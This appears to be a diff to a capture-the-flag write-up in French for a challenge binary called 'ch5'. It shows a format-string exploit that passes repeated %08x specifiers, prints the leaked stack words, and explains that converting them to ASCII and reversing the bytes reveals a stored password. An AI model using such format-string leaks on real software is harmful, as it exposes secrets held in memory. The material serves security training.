@@ -1,3 +1,6 @@
+## grace a un certaine no,bre de %08x on va pouvoir afficher en hexa ce qui a ete lu dans le fichier ou est contenu le mot de passe. Il suffit de les convertir en ascii et de les inverser pour obtenir le mot de passe.
+
+
 ./ch5 "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
 --> 00000020 0804b008 b7fcfff4 08048570 08049ff4 00000002 bffffcc4 b7fd03e4 0000000d 0804b008 39617044 28293664 6d617045 b7000a64
 
